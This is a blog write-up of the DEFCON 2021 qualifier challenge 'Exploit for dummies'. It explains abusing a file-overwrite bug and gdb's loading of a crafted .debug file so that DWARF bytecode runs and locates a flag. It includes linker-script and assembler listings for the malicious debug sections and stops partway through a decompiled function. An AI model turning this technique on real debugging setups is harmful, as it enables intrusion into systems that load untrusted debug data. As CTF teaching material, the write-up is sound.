<!DOCTYPE html><html lang=en><head><title>DEFCON quals 2021 - Exploit for dummies</title><meta charset=UTF-8><meta name=viewport content="width=device-width"><link rel=stylesheet type=text/css href=/static/css/style.css><link rel=stylesheet type=text/css href=/static/css/native.css></head><body><main><nav><ul><li><a href=/ >&gt; index</a></li><li><a href=/b>&gt; blog</a></li><li><a href=https://github.com/xarkes>&gt; git</a></li><li><a href=https://twitter.com/xarkes_>&gt; twitter</a></li></ul></nav><article><h1><a href=/b/defcon-quals-2021-exploit-for-dummies.html>DEFCON quals 2021 - Exploit for dummies</a></h1><p class=meta>Published on 10 May 2021</p><p>Around 10 days ago was <a href=https://oooverflow.io/dc-ctf-2021-quals/ >DEFCON qualifiers</a> and I had a chance to take a look at the challenges. My eyes stopped on "Exploit for dummies" as I recognised myself in the term "dummy" and hoped I could solve this one.</p><p>The challenge was marked as "shellcoding" and believe it or not it will deal with <a href=https://en.wikipedia.org/wiki/DWARF>DWARF</a> debugging data format.</p><h2>A trivia quizz</h2><p>We are given an ELF binary named <code>trivia</code> which first reads <code>../../flag</code> and stores it at a random location in memory thanks to a weird request to <code>mmap</code>. After that, it reads the <code>questions.txt</code> file to ask questions from various categories to the player.</p><p>When the player reaches a score of 5000, it asks the player to save their name in a file on the filesystem. There are not many checks about the filename, and thus it is possible to trigger a segfault when trying to overwrite the value of a non writable file, e.g. <code>questions.txt</code>, although some checks are done with <a href=https://linux.die.net/man/2/access>access</a>. The name itself (which would be stored in the file) is read with the function <a href=https://linux.die.net/man/3/fgets>fgets</a> which reads at most <code>0x3ff</code> bytes so that means we can write any file in the current directory of size <code>&lt;= 1023</code> as long as it contains no <code>\n</code> character (which would interrupt the reading of <code>fgets</code>).</p><p>When connecting to the remote target, we get the following:</p><div class=codehilite><pre><span></span><code><span class=gp>$ </span>nc exploit-for-dummies.challenges.ooo <span class=m>5000</span>
<span class=go>Ok, listen... here is the deal.</span>
<span class=go>Now I am going to let you interact with a program.</span>
<span class=go>You need to get the flag (that&#39;s the goal in a CTF, in case you did not notice that)</span>
<span class=go>But I am here to help you. So, if you make the program crash and you give me the address of</span>
<span class=go>the flag, I am going to get it out of the memory and print it for you.</span>
<span class=go>Isn&#39;t it nice?</span>

<span class=go>Ready? Here we go... just press ENTER and I&#39;ll spawn the service up for you.</span>

<span class=go>starting...</span>
<span class=go>cd ./tmp/dir_2663717</span>
<span class=go>./trivia</span>
<span class=go>--[ Score: 0 ]--</span>

<span class=go>Secret Passwords for 200:</span>
<span class=go>Super-secure launching code for Nuclear silos during the cold war.</span>
</code></pre></div><p>We learn that the wrapper running remotely will handle a crash in the program and give us the memory content at a given address. So we have to gather all the questions, and answer them correctly. Here are the questions followed by their expected answer right below:</p><div class=codehilite><pre><span></span><code>OOO is using a log-decay dynamic scoring formula in which the number of teams who solved a challenge is multiplied by which constant?
0.08
He once won a game of Connect Four in three moves, and inspired a Facebook master password
Chuck Norris
Which American group recorded a song named Ooo?
!!!
It was the first trivia question in the 2006 DEF CON quals. It all started like this: &quot;Hack the ....&quot;
planet
The famous president Skroob luggage combination
12345
What is the most common meaning of the OOO abbreviation according to wikipedia?
Out of Office
What was the first year in which OOO organized the defcon CTF?
2018
Level 1 questions make CISSPs turn red, Level 2 make SANS Fellows cry in frustration. We are talking of course of the CTF organized by...
ddtek
He described a penicillin shot in the ass as  &quot;the worst thing that has ever happened to me&quot;. He is the one and only..
Kevin Mitnick
Default passwords for IBM 8225 systems
A52896nG93096a
It is 2008. It is the end of the cache as we know it. Or...
64K Should Be Good Enough For Anyone
When David Lightman hacked into the school system to change his grade in Biology 2, the school password was..
pencil
In this year, IDA Pro 5.0 introduced the first GUI.
2006
They took over the Defcon CTF organization in 2002, and defined the game as we all know and love today.
Ghetto Hackers
DNS guru, and the first person Dan called in 2008 to discuss its newly discovered DNS flaw.
Paul Vixie
What is the name of the legitbs 9-bit middle endian architecture?
Clemency
Its three-letter acronym is used by astronomers to indicate double neutron stars
Domain Name System
The name of the university from which he obtained his bachelor&#39;s degree.
Santa Clara University
Smashing the Stack for Fun and Profit. We all know it by heart, right? But do you remember its last sentence?
Use the source d00d
In 1992, the Zero Wing videogame shocked the world with the phrase:
All your base are belong to us
Super-secure launching code for Nuclear silos during the cold war.
00000000
In the defcon quals 2020, what was the highest ranked team that had three letters O in its name?
YOKARO-MON
Who (person) was the famous Defcon CTF organizer who said &quot;The Scoring System determines the quality of the game&quot;
Caezar
What was the first column in the first Jeopardy qualification board introduced by Kenshoto in 2006?
Binary L33tness
We are obviously talking about Dan ...
kaminsky
</code></pre></div><p>After making a quick and dirty script to answer the questions, we can manage to get asked which file to save, specify we want to overwrite <code>questions.txt</code> and confirm that after crashing the wrapper launches a gdb session with <code>gdb -c core trivia</code> and executes <code>x/s</code> with our provided address. We also learn the address format should start with <code>0x</code> and be at most 16 characters.</p><p>Okay, so what can we do now? After the command is executed, the wrapper finishes and closes the remote connection, so it seems there is no way we can dump multiple addresses. We know we can write a file to the filesystem before triggering a segfault by playing 2 games in a row. We tried to overwrite a file <code>core</code> to make gdb believe we are in another state and somehow manage to do things later on like reading the file from the filesystem directly, as the flag is either stored in the program memory which is dumped in <code>core</code> after the segmentation fault, or in the <code>../../flag</code> file, but it seemed it would get overwritten by the generated core file. We also tried to overwrite the binary itself so upon invocation of <code>gdb</code> it would have loaded a custom ELF file, but overwriting the file was not possible.</p><h2>.gnu_debuglink to the rescue</h2><p>After calling <code>strace</code> on gdb and running it on our binary we can see that it tries to load the file named <code>trivia.debug</code> in the current directory.</p><div class=codehilite><pre><span></span><code>$ strace gdb trivia <span class=m>2</span>&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> grep <span class=nv>$PWD</span>
...
openat<span class=o>(</span>AT_FDCWD, <span class=s2>&quot;/share/trivia&quot;</span>, O_RDONLY<span class=o>)</span> <span class=o>=</span> <span class=m>13</span>
readlink<span class=o>(</span><span class=s2>&quot;/share/&quot;</span>, 0x7ffc1670f6b0, <span class=m>1023</span><span class=o>)</span> <span class=o>=</span> -1 EINVAL <span class=o>(</span>Invalid argum
faccessat2<span class=o>(</span>AT_FDCWD, <span class=s2>&quot;/share/&quot;</span>, F_OK, AT_EACCESS<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
openat<span class=o>(</span>AT_FDCWD, <span class=s2>&quot;/share/trivia.debug&quot;</span>, O_RDONLY<span class=p>|</span>O_CLOEXEC<span class=o>)</span> <span class=o>=</span> <span class=m>14</span><span class=o>)</span>
...
</code></pre></div><p>As we can learn from gdb's <a href=https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html>documentation</a> the <code>.debug</code> files are usually used to store extra debug symbols. The original binary writes the filename in a section named <code>.gnu_debuglink</code>. This section also contains a CRC32 checksum in order to verify that the file being loaded matches what the original binary expects to see.</p><p>If I had been more careful, I could have spotted it while checking the sections of the binary:</p><div class=codehilite><pre><span></span><code>$ readelf -W -S trivia
...
  <span class=o>[</span><span class=m>28</span><span class=o>]</span> .gnu_debuglink    PROGBITS        <span class=m>0000000000000000</span> 00310c <span class=m>000014</span> <span class=m>00</span>      <span class=m>0</span>   <span class=m>0</span>  <span class=m>4</span>
...
</code></pre></div><p>Okay so that's great, it means we can write an ELF file of at most 1023 bytes named <code>trivia.debug</code> and this file will get loaded by gdb. Well, actually we also have to make sure the CRC matches the one that is hardcoded in the <code>.gnu_debuglink</code> section, but we'll think about that later.</p><p>Now my intuition was that I would have the possibility to write a debug symbol that would point directly to some place in memory and dump the flag like this. But well, the flag is allocated and stored at a random position in memory so it seemed not possible, especially since we can only trigger the call to gdb once.</p><p>However this debug file thingy reminded me of a step in the <a href=https://www.sstic.org/2019/challenge/ >SSTIC challenge 2019</a> that would implement a whole cryptographic algorithm using only DWARF debug information.</p><h2>Creating custom DWARF information</h2><p>After I reminded this, I quickly spotted the function <a href=https://github.com/bminor/binutils-gdb/blob/master/gdb/dwarf2/expr.c#L548><code>dwarf_expr_context::execute_stack_op</code></a> in <code>gdb</code> source code to confirm that there is indeed a whole virtual machine for DWARF, and tried to find a way to reach it from the <code>x/s</code> command.</p><p>That was not easy and at some point I found the amazing DWARF v4 <a href=http://dwarfstd.org/doc/DWARF4.pdf>specification</a> which says:</p><blockquote><p>A DWARF procedure is represented by any kind of debugging information entry that has a DW_AT_location attribute.</p></blockquote><p>So I was more confident there would be a way to actually execute code by calling <code>x/s</code> and I started playing around by crafting ELF files.</p><h3>Crafting small ELF files</h3><p>First things first, I wanted to make sure my files would fit in 1023 bytes as that would be our goal ultimately. And since I also wanted to manually craft the sections that would contain the DWARF information, I decided to make a linker script that would remove any unused section.</p><div class=codehilite><pre><span></span><code>OUTPUT_FORMAT(elf64-x86-64)
SECTIONS
{
  .debug_info : {
    debug_info.o(.debug_info)
  }
  .debug_abbrev : {
    debug_abbrev.o(.debug_abbrev)
  }
  .debug_str : {
    debug_str.o(.debug_str)
  }
  /DISCARD/ : {
    *(.text)
    *(.bss)

    *(.debug_str)
    *(.debug_abbrev)
    *(.debug_info)

    *(.debug_line)
    *(.debug_aranges)
    *(.eh_frame)
    *(.note.gnu.property)
    *(.comment)
  }
}
</code></pre></div><p>I even removed the <code>.text</code> section as I didn't plan to execute any code, so in the end only the <code>.symtab</code>, <code>.strtab</code> and <code>.shstrtab</code> sections remained and couldn't be removed with the linker script but that was not an issue as my file was already below 1023 bytes.</p><p>The <code>.o</code> files would be simple asm files <code>.s</code> which contain either raw content with <code>.incbin</code> or raw data with <code>.byte</code> or <code>.asciz</code>.</p><div class=codehilite><pre><span></span><code><span class=na>.section</span> <span class=no>.debug_info</span>
<span class=na>.incbin</span> <span class=s>&quot;debug_info.raw&quot;</span>
</code></pre></div><p></p><div class=codehilite><pre><span></span><code><span class=na>.section</span> <span class=no>.debug_str</span>
<span class=na>.asciz</span> <span class=s>&quot;mysym&quot;</span>
<span class=na>.byte</span> <span class=mi>0</span>
</code></pre></div><h3>Understanding DWARF</h3><p>Thanks to the command <code>objdump -g testfile</code> it was possible to see that the relevant DWARF information are loaded mainly from 3 different sections named <code>.debug_info</code>, <code>.debug_abbrev</code> and <code>.debug_str</code>.</p><div class=codehilite><pre><span></span><code><span class=gp>$ </span>objdump -g tiny.o

<span class=go>tiny.o:     file format elf64-x86-64</span>

<span class=go>Contents of the .debug_info section (loaded from tiny.o):</span>

<span class=go>  Compilation Unit @ offset 0x0:</span>
<span class=go>   Length:        0x75 (32-bit)</span>
<span class=go>   Version:       4</span>
<span class=go>   Abbrev Offset: 0x0</span>
<span class=go>   Pointer Size:  8</span>
<span class=go> &lt;0&gt;&lt;b&gt;: Abbrev Number: 1 (DW_TAG_compile_unit)</span>
<span class=go>    &lt;c&gt;   DW_AT_producer    : (indirect string, offset: 0x41): GNU C17 10.2.0 -mtune=generic -march=x86-64 -g -fno-pic -fno-stack-protector</span>
<span class=go>    &lt;10&gt;   DW_AT_language    : 12   (ANSI C99)</span>
<span class=go>    &lt;11&gt;   DW_AT_name        : (indirect string, offset: 0x3a): tiny.c</span>
<span class=go>    &lt;15&gt;   DW_AT_comp_dir    : (indirect string, offset: 0x12): /share/</span>
<span class=go>    &lt;19&gt;   DW_AT_low_pc      : 0x0</span>
<span class=go>    &lt;21&gt;   DW_AT_high_pc     : 0xb</span>
<span class=go>    &lt;29&gt;   DW_AT_stmt_list   : 0x0</span>
<span class=go> &lt;1&gt;&lt;2d&gt;: Abbrev Number: 2 (DW_TAG_enumeration_type)</span>
<span class=go>    &lt;2e&gt;   DW_AT_name        : (indirect string, offset: 0x0): chat</span>
<span class=go>    &lt;32&gt;   DW_AT_encoding    : 7    (unsigned)</span>
<span class=go>    &lt;33&gt;   DW_AT_byte_size   : 4</span>
<span class=go>    &lt;34&gt;   DW_AT_type        : &lt;0x4c&gt;</span>
<span class=go>    &lt;38&gt;   DW_AT_decl_file   : 1</span>
<span class=go>    &lt;39&gt;   DW_AT_decl_line   : 1</span>
<span class=go>    &lt;3a&gt;   DW_AT_decl_column : 6</span>
<span class=go>    &lt;3b&gt;   DW_AT_sibling     : &lt;0x4c&gt;</span>
<span class=go> &lt;2&gt;&lt;3f&gt;: Abbrev Number: 3 (DW_TAG_enumerator)</span>
<span class=go>    &lt;40&gt;   DW_AT_name        : (indirect string, offset: 0x5): first</span>
<span class=go>    &lt;44&gt;   DW_AT_const_value : 51</span>
<span class=go> &lt;2&gt;&lt;45&gt;: Abbrev Number: 3 (DW_TAG_enumerator)</span>
<span class=go>    &lt;46&gt;   DW_AT_name        : (indirect string, offset: 0xb): second</span>
<span class=go>    &lt;4a&gt;   DW_AT_const_value : 52</span>
<span class=go> &lt;2&gt;&lt;4b&gt;: Abbrev Number: 0</span>
<span class=go> &lt;1&gt;&lt;4c&gt;: Abbrev Number: 4 (DW_TAG_base_type)</span>
<span class=go>    &lt;4d&gt;   DW_AT_byte_size   : 4</span>
<span class=go>    &lt;4e&gt;   DW_AT_encoding    : 7    (unsigned)</span>
<span class=go>    &lt;4f&gt;   DW_AT_name        : (indirect string, offset: 0x2d): unsigned int</span>

<span class=go> [...] ; snip</span>

<span class=go>Contents of the .debug_abbrev section (loaded from tiny.o):</span>

<span class=go>  Number TAG (0x0)</span>
<span class=go>   1      DW_TAG_compile_unit    [has children]</span>
<span class=go>    DW_AT_producer     DW_FORM_strp</span>
<span class=go>    DW_AT_language     DW_FORM_data1</span>
<span class=go>    DW_AT_name         DW_FORM_strp</span>
<span class=go>    DW_AT_comp_dir     DW_FORM_strp</span>
<span class=go>    DW_AT_low_pc       DW_FORM_addr</span>
<span class=go>    DW_AT_high_pc      DW_FORM_data8</span>
<span class=go>    DW_AT_stmt_list    DW_FORM_sec_offset</span>
<span class=go>    DW_AT value: 0     DW_FORM value: 0</span>
<span class=go>   2      DW_TAG_enumeration_type    [has children]</span>
<span class=go>    DW_AT_name         DW_FORM_strp</span>
<span class=go>    DW_AT_encoding     DW_FORM_data1</span>
<span class=go>    DW_AT_byte_size    DW_FORM_data1</span>
<span class=go>    DW_AT_type         DW_FORM_ref4</span>
<span class=go>    DW_AT_decl_file    DW_FORM_data1</span>
<span class=go>    DW_AT_decl_line    DW_FORM_data1</span>
<span class=go>    DW_AT_decl_column  DW_FORM_data1</span>
<span class=go>    DW_AT_sibling      DW_FORM_ref4</span>
<span class=go>    DW_AT value: 0     DW_FORM value: 0</span>
<span class=go>   3      DW_TAG_enumerator    [no children]</span>
<span class=go>    DW_AT_name         DW_FORM_strp</span>
<span class=go>    DW_AT_const_value  DW_FORM_data1</span>
<span class=go>    DW_AT value: 0     DW_FORM value: 0</span>
<span class=go>   4      DW_TAG_base_type    [no children]</span>
<span class=go>    DW_AT_byte_size    DW_FORM_data1</span>
<span class=go>    DW_AT_encoding     DW_FORM_data1</span>
<span class=go>    DW_AT_name         DW_FORM_strp</span>
<span class=go>    DW_AT value: 0     DW_FORM value: 0</span>

<span class=go> [...] ; snip</span>

<span class=go>Contents of the .debug_str section (loaded from tiny.o):</span>

<span class=go>  0x00000000 63686174 00666972 73740073 65636f6e chat.first.secon</span>
<span class=go>  0x00000010 64002f73 68617265 2f64756d 6d696573 d./share/dummies</span>
<span class=go>  0x00000020 5f776f72 6b005f73 74617274 00756e73 _work._start.uns</span>
<span class=go>  0x00000030 69676e65 6420696e 74007469 6e792e63 igned int.tiny.c</span>
<span class=go>  0x00000040 00474e55 20433137 2031302e 322e3020 .GNU C17 10.2.0</span>
<span class=go>  0x00000050 2d6d7475 6e653d67 656e6572 6963202d -mtune=generic -</span>
<span class=go>  0x00000060 6d617263 683d7838 362d3634 202d6720 march=x86-64 -g</span>
<span class=go>  0x00000070 2d666e6f 2d706963 202d666e 6f2d7374 -fno-pic -fno-st</span>
<span class=go>  0x00000080 61636b2d 70726f74 6563746f 7200     ack-protector.</span>
</code></pre></div><p>We understand that the <code>.debug_abbrev</code> section is used to describe some structures or abbrevations, and that the <code>.debug_info</code> contains the actual debugging information which refers to structures from the aforementioned section. The <code>.debug_str</code> is used to contain the debug string information such as variable names, file names, etc.</p><p>It means that we can declare any structure in <code>.debug_abbrev</code> with any possible content, and we can refer to the created structure in <code>.debug_info</code> in a way to say "hey there's a debug symbol available of the form that is described in the abbrev section and here is its content".</p><p>From there I needed to solve two things:</p><ol><li>Generate a symbol that upon printing would execute a DWARF bytecode</li><li>Make sure that symbol is reachable from any context</li></ol><p>For the first thing, as we briefly mentioned before, creating a <code>DW_TAG_variable</code> with a <code>DW_AT_name</code> pointing to the name I want to give to my symbol, and with a <code>DW_AT_location</code> field allows to execute DWARF bytecode. I can write any <code>DW_OP_xxx</code> opcode in my structure information, and during debugging it would change the value of what <code>x/s mysym</code> would print, or even better yield that my opcode is invalid. But I only managed to make it work when creating a local variable and calling <code>x/s</code> from a context for which the variable was actually reachable.</p><p>For the second thing, I realised that using a field with a <code>DW_TAG_enumerator</code> with a <code>DW_AT_const_value</code> attribute would allow me to print it from any context (while the variable is reachable only if the debugger is stopped in its scope). I couldn't find how to enlarge the scope of the variable so I decided to go with the enumerator, however it seemed not compatible with <code>DW_AT_location</code>. When calling <code>x/s mysym</code> it would just say that the symbol does not exist, exactly as with the <code>DW_TAG_variable</code> as seen just before.</p><p>After a while I managed to do the following trick which consists in writing in the <code>.debug_info</code> first the <code>DW_TAG_variable</code> with a <code>DW_AT_location</code> attribute pointing to the name <code>mysym</code> and then a second entry <code>DW_TAG_variable</code> with a <code>DW_AT_const_value</code> also pointing to the name <code>mysym</code>. My understanding is that thanks to the second entry, gdb is able to find the symbol when doing <code>x/s mysym</code> (probably thanks to the attribute <code>DW_AT_const_value</code>) but that it will fetch the first occurrence of the symbol (the one with <code>DW_AT_location</code>) when actually getting the value.</p><p>It seems easy when written in a few sentences but it took me quite a while to figure this trick out. I'm pretty sure there are smarter ways to do it, but well, the challenge is named "exploit for dummies" after all, so I thought doing so would be completely appropriate.</p><p>In the end I came up with the following files:</p><div class=codehilite><pre><span></span><code><span class=na>.section</span> <span class=no>.debug_abbrev</span>
<span class=c1>## Type 1</span>
<span class=c1># Type ID</span>
<span class=na>.byte</span> <span class=mi>0x01</span>
<span class=c1># Content</span>
<span class=na>.byte</span> <span class=mi>0x11</span><span class=p>,</span> <span class=mi>0x01</span><span class=p>,</span> <span class=mi>0x25</span><span class=p>,</span> <span class=mi>0x0e</span><span class=p>,</span> <span class=mi>0x13</span><span class=p>,</span> <span class=mi>0x0b</span><span class=p>,</span> <span class=mi>0x03</span><span class=p>,</span> <span class=mi>0x0e</span><span class=p>,</span> <span class=mi>0x1b</span><span class=p>,</span> <span class=mi>0x0e</span><span class=p>,</span> <span class=mi>0x11</span><span class=p>,</span> <span class=mi>0x01</span><span class=p>,</span> <span class=mi>0x12</span><span class=p>,</span> <span class=mi>0x07</span><span class=p>,</span> <span class=mi>0x10</span><span class=p>,</span> <span class=mi>0x17</span>
<span class=c1># End marker</span>
<span class=na>.byte</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>

<span class=c1>## Type 3</span>
<span class=c1># Type ID</span>
<span class=na>.byte</span> <span class=mi>0x03</span>
<span class=c1># Field 0 (DW_TAG_variable)</span>
<span class=na>.byte</span> <span class=mi>0x34</span><span class=p>,</span> <span class=mi>0x00</span>
<span class=c1># Field 1 (DW_AT_name, DW_FORM_strp) string pointer to symbol name</span>
<span class=na>.byte</span> <span class=mi>0x03</span><span class=p>,</span> <span class=mi>0x0e</span>
<span class=c1># Field 2 (DW_AT_const_value, DW_AT_FORM_data1) constant on 1 byte</span>
<span class=na>.byte</span> <span class=mi>0x1c</span><span class=p>,</span> <span class=mi>0x0b</span>
<span class=c1># End marker</span>
<span class=na>.byte</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>

<span class=c1>## Type 4</span>
<span class=c1># Type ID</span>
<span class=na>.byte</span> <span class=mi>0x04</span>
<span class=c1># Field 0 (DW_TAG_variable)</span>
<span class=na>.byte</span> <span class=mi>0x34</span><span class=p>,</span> <span class=mi>0x00</span>
<span class=c1># Field 1 (DW_AT_name, DW_FORM_strp) string pointer to symbol name</span>
<span class=na>.byte</span> <span class=mi>0x03</span><span class=p>,</span> <span class=mi>0x0e</span>
<span class=c1># Field 2 (DW_AT_location, DW_FORM_exprloc) dwarf subprogram to compute location</span>
<span class=na>.byte</span> <span class=mi>0x02</span><span class=p>,</span> <span class=mi>0x18</span>
<span class=c1># End marker</span>
<span class=na>.byte</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>

<span class=c1># End marker</span>
<span class=na>.byte</span> <span class=mi>0x00</span>
</code></pre></div><p></p><div class=codehilite><pre><span></span><code><span class=na>.section</span> <span class=no>.debug_info</span>
<span class=c1># section length</span>
<span class=na>.byte</span> <span class=mi>0x37</span><span class=err>+</span><span class=no>SHELLCODE_SIZE</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>
<span class=c1># dwarf version</span>
<span class=na>.byte</span> <span class=mi>0x04</span><span class=p>,</span> <span class=mi>0x00</span>
<span class=c1># debug_abbrev offset</span>
<span class=na>.byte</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>
<span class=c1># pointer size</span>
<span class=na>.byte</span> <span class=mi>0x08</span>

<span class=c1>### Entries</span>
<span class=c1>## Entry 1 (type 1)</span>
<span class=c1># Tag (entry number in .debug_abbrev section)</span>
<span class=na>.byte</span> <span class=mi>0x01</span>
<span class=c1># Data</span>
<span class=na>.byte</span> <span class=mi>0x2d</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x0c</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x12</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x10</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x0b</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>

<span class=c1>## Entry 2 (type 4)</span>
<span class=c1># Tag</span>
<span class=na>.byte</span> <span class=mi>0x04</span>
<span class=c1># String pointer (offset 5 of .debug_str)</span>
<span class=na>.byte</span> <span class=mi>0x05</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>
<span class=c1># Shellcode size</span>
<span class=na>.byte</span> <span class=no>SHELLCODE_SIZE</span>
<span class=c1># Shellcode data</span>
<span class=na>.byte</span> <span class=no>SHELLCODE</span>

<span class=c1>## Entry 3 (type 3)</span>
<span class=c1># Tag</span>
<span class=na>.byte</span> <span class=mi>0x03</span>
<span class=c1># String pointer (offset 5 of .debug_str)</span>
<span class=na>.byte</span> <span class=mi>0x05</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>
<span class=c1># Constant value</span>
<span class=na>.byte</span> <span class=mi>0x33</span>

<span class=c1>## End marker</span>
<span class=na>.byte</span> <span class=mi>0x00</span><span class=p>,</span> <span class=mi>0x00</span>
</code></pre></div><p>The first entry used as a <code>DW_TAG_compile_unit</code> does not seem useful, but I had troubles with gdb segfaulting when not providing it, so I preferred keeping it.</p><p>We will come up to the shellcode part in the next section, however this provides the following debug information:</p><div class=codehilite><pre><span></span><code><span class=gp>$ </span>objdump -g trivia.debug

<span class=go>trivia.debug:     file format elf64-x86-64</span>

<span class=go>Contents of the .debug_info section (loaded from trivia.debug):</span>

<span class=go>  Compilation Unit @ offset 0x0:</span>
<span class=go>   Length:        0x75 (32-bit)</span>
<span class=go>   Version:       4</span>
<span class=go>   Abbrev Offset: 0x0</span>
<span class=go>   Pointer Size:  8</span>
<span class=go> &lt;0&gt;&lt;b&gt;: Abbrev Number: 1 (DW_TAG_compile_unit)</span>
<span class=go>    &lt;c&gt;   DW_AT_producer    : (indirect string, offset: 0x2d): GNU C17 10.2.0 -mtune=generic -march=x86-64 -g -fno-stack-protector</span>
<span class=go>    &lt;10&gt;   DW_AT_language    : 12   (ANSI C99)</span>
<span class=go>    &lt;11&gt;   DW_AT_name        : (indirect string, offset: 0x0): chat</span>
<span class=go>    &lt;15&gt;   DW_AT_comp_dir    : (indirect string, offset: 0x12): /share/dummies_work</span>
<span class=go>    &lt;19&gt;   DW_AT_low_pc      : 0x1000</span>
<span class=go>    &lt;21&gt;   DW_AT_high_pc     : 0xb</span>
<span class=go>    &lt;29&gt;   DW_AT_stmt_list   : 0x0</span>
<span class=go> &lt;1&gt;&lt;2d&gt;: Abbrev Number: 4 (DW_TAG_variable)</span>
<span class=go>    &lt;2e&gt;   DW_AT_name        : (indirect string, offset: 0x5): first</span>
<span class=go>    &lt;32&gt;   DW_AT_location    : 2 byte block: 77 0 (DW_OP_breg7 (rsp): 0)</span>
<span class=go> &lt;1&gt;&lt;71&gt;: Abbrev Number: 3 (DW_TAG_variable)</span>
<span class=go>    &lt;72&gt;   DW_AT_name        : (indirect string, offset: 0x5): first</span>
<span class=go>    &lt;76&gt;   DW_AT_const_value : 51</span>
<span class=go> &lt;1&gt;&lt;77&gt;: Abbrev Number: 0</span>

<span class=go>Contents of the .debug_abbrev section (loaded from trivia.debug):</span>

<span class=go>  Number TAG (0x0)</span>
<span class=go>   1      DW_TAG_compile_unit    [has children]</span>
<span class=go>    DW_AT_producer     DW_FORM_strp</span>
<span class=go>    DW_AT_language     DW_FORM_data1</span>
<span class=go>    DW_AT_name         DW_FORM_strp</span>
<span class=go>    DW_AT_comp_dir     DW_FORM_strp</span>
<span class=go>    DW_AT_low_pc       DW_FORM_addr</span>
<span class=go>    DW_AT_high_pc      DW_FORM_data8</span>
<span class=go>    DW_AT_stmt_list    DW_FORM_sec_offset</span>
<span class=go>    DW_AT value: 0     DW_FORM value: 0</span>
<span class=go>   3      DW_TAG_variable    [no children]</span>
<span class=go>    DW_AT_name         DW_FORM_strp</span>
<span class=go>    DW_AT_const_value  DW_FORM_data1</span>
<span class=go>    DW_AT value: 0     DW_FORM value: 0</span>
<span class=go>   4      DW_TAG_variable    [no children]</span>
<span class=go>    DW_AT_name         DW_FORM_strp</span>
<span class=go>    DW_AT_location     DW_FORM_exprloc</span>
<span class=go>    DW_AT value: 0     DW_FORM value: 0</span>
</code></pre></div><h3>Generating the DWARF shellcode</h3><p>Now that we can execute dwarf bytecode, we have to figure out where the flag is stored in memory. The code can be summed up like this:</p><div class=codehilite><pre><span></span><code><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
  <span class=kr>__int64</span> <span class=n>rand_stack2</span><span class=p>;</span>          <span class=c1>// rbx</span>
  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span>              <span class=c1>// eax</span>
  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>                        <span class=c1>// [rsp+18h] [rbp-58h]</span>
  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>                       <span class=c1>// [rsp+1Ch] [rbp-54h]</span>
  <span class=kt>char</span> <span class=o>*</span><span class=n>rand_map</span><span class=p>;</span>               <span class=c1>// [rsp+20h] [rbp-50h]</span>
  <span class=kr>__int64</span> <span class=n>rand_stack</span><span class=p>;</span>           <span class=c1>// [rsp+28h] [rbp-48h] BYREF</span>
  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>mmap_offset</span><span class=p>;</span> <span class=c1>// [rsp+30h] [rbp-40h] BYREF</span>
  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>score</span><span class=p>;</span>       <span class=c1>// [rsp+38h] [rbp-38h]</span>
  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>highscore</span><span class=p>;</span>   <span class=c1>// [rsp+40h] [rbp-30h]</span>
  <span class=n>fdata</span> <span class=o>*</span><span class=n>heapvar</span><span class=p>;</span>               <span class=c1>// [rsp+48h] [rbp-28h]</span>
  <span class=kt>FILE</span> <span class=o>*</span><span class=n>stream</span><span class=p>;</span>                 <span class=c1>// [rsp+50h] [rbp-20h]</span>
  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>canary</span><span class=p>;</span>      <span class=c1>// [rsp+58h] [rbp-18h]*</span>

  <span class=n>canary</span> <span class=o>=</span> <span class=n>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
  <span class=n>heapvar</span> <span class=o>=</span> <span class=p>(</span><span class=n>fdata</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x18uLL</span><span class=p>);</span>
